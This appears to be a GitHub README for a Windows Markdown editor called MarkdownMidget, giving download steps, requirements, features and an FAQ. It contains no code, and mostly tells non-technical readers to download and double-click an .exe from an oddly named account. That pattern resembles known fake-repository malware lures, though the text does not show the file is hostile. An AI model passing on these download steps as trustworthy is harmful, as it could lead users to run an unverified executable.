# 📝 MarkdownMidget - Easy writing for your everyday documents

[![](https://img.shields.io/badge/Download-MarkdownMidget-blue?style=for-the-badge)](https://github.com/Neoplatonismhomingtorpedo116/MarkdownMidget/releases)

MarkdownMidget helps you write text. You see your changes as you type. It works like WordPad but uses the simple Markdown format. You do not need to know code to use this tool. 

## 📥 How to start

Visit the GitHub release page to get the software. Follow these steps to set it up on your computer.

1. Go to [this download page](https://github.com/Neoplatonismhomingtorpedo116/MarkdownMidget).
2. Look for the Assets section at the bottom of the latest release.
3. Click the file ending in .exe to start your download.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to open the installer.
6. Follow the prompts on your screen to complete the installation.
7. Launch the app from your Start menu once the process finishes.

## 🛠 What you need

Your computer needs a few things to run this tool well. Make sure you meet these requirements.

* Windows 10 or Windows 11.
* A screen resolution of 1280 by 720 or higher.
* At least 200 megabytes of free storage space.
* The WebView2 Runtime. Most modern Windows systems have this. The installer will help you get it if it is missing.

## ✨ Main features

MarkdownMidget combines the look of a simple text editor with the power of modern web technology. 

* Live Preview: Your formatting shows up instantly. You see bold, italic, and headers as you type.
* Familiar Design: The layout works like standard word editors you know already.
* Markdown Support: Save files in a standard format that works in other apps.
* Fast Startup: The app opens quickly so you can start your work without delays.
* Local Storage: Save your documents anywhere on your hard drive. You keep full control of your data.

## ✒️ How to write

You type in the main window just like a regular document. The app handles the technical tags for you. 

* Bold text: Select your text and use the format menu or keyboard shortcuts.
* Headers: Use the top menu to create titles and subtitles for your work.
* Lists: Pick the list button to organize your points.
* Links: Highlight text and press the link button to add a web address.
* Saving: Press the save button to keep your file as a .md file.

## ❓ Frequently asked questions

People often ask these questions about the editor.

**Does this app share my data?**
No. Your documents stay on your computer. We do not store or track your files.

**Can I open my existing text files?**
Yes. Use the File menu to open any standard text or markdown file.

**What happens if the app closes?**
The app saves files when you click the save icon. It does not auto-save every change, so please click save often.

**Can I change how the text looks?**
You can use the basic formatting options provided in the menu bar. We focus on clean, simple text to keep the app fast.
